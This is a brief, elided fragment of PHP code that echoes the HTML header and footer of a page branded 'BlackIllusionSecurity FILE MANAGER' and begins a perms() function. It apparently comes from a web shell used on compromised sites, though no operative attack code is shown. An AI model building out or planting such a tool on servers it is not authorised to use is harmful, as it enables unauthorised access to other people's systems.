...
echo '</head>
<body><b>
<H1><center> &lt;/&gt; <font color="red">BlackIllusionSecurity</font> <font color="dodgerblue">FILE MANAGER</font></center></h1>
...
echo '<br><center>Black Illusion Security</b></body>
</html>';
function perms($file){
